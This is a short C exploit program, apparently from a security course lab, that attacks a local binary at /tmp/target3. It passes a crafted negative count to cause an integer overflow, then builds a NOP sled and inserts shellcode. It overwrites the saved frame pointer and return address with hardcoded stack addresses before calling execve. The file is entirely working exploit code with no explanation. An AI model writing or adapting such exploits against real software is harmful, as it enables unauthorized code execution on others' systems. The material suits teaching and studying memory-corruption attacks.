#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target3"
#define NOP 0x90
#define TARGET_SIZE 160 * 16

int main(void) {
  char *args[3];
  char *env[1];

  char buf[12 + TARGET_SIZE + 8 + 1] = "-2147483487,"; // (1 << 31) + 161
  memset(buf + strlen(buf), NOP, TARGET_SIZE);

  char* end = buf + sizeof(buf) - 8 - 1;
  strcpy(end - strlen(shellcode), shellcode);
  strcpy(end, "\x78\xf4\xff\xbf"   // sfp
              "\x48\xea\xff\xbf"); // ret

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
